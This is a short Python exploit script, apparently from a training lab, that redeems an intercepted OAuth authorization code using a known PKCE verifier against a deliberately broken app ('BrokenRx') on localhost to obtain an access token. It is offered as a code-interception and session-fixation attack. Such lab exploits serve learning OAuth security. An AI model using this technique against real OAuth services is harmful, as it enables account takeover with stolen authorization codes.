#!/usr/bin/python3
'''
Manual Exploitation of PKCE misuse
'''

import requests

def exchange_token(code, pkce_verifier):
    '''
    Function which receives Callback code and known PKCE verifier to generate
    access token
    '''

    data = {
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": "http://localhost:5000/callback",
        "client_id": "BrokenRx_client",
        "code_verifier": pkce_verifier,
    }
    r = requests.post("http://localhost:8000/token", data=data)

    return r.json()

print("[*] Starting BrokenRx OAuth Exploitation - Code Reuse")
print("[*] PKCE Misuse > Code Interception > Session Fixation")
print()

code = input("Enter Callback Code Received:     ")
pkce_verifier = input("Enter PKCE Verifier:     ")
response = exchange_token(code, pkce_verifier)
print(response)